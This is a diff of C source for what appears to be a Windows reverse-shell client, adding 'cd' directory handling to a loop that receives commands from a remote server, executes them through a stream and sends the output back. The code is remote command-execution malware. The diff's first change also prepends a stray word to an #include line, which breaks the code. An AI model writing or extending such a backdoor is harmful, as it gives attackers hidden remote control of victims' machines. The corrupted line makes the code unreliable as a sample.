@@ -1,4 +1,4 @@
-#include <stdio.h>
+directories#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <winsock2.h>
@@ -27,8 +27,11 @@ void Shell() {
         //recive from the server
         recv(sock, buffer, 1024, 0);
         
-        if(strncmp("q", buffer, 1) == 0) {
+        if(strncmp("q", buffer, 1) == 0) { //string compare(a, b, number of chars)
             break;
+        } else if (strncmp("cd ", buffer, 3) == 0) {
+            char *temp = buffer + 3;
+            chdir(temp); //changes program dir
         } else {
             //execute command
             FILE *file; //file is basically just used as a string stream
@@ -37,6 +40,7 @@ void Shell() {
             //read response from stream ("file" in this case)
             while(fgets(container, 1024, file) != NULL) {
                 //moves chars from container to total response
+                //TODO: Try swapping the while with fgets to total response
                 strcat(totalResponse, container);
             }
             send(sock, totalResponse, sizeof(totalResponse), 0);
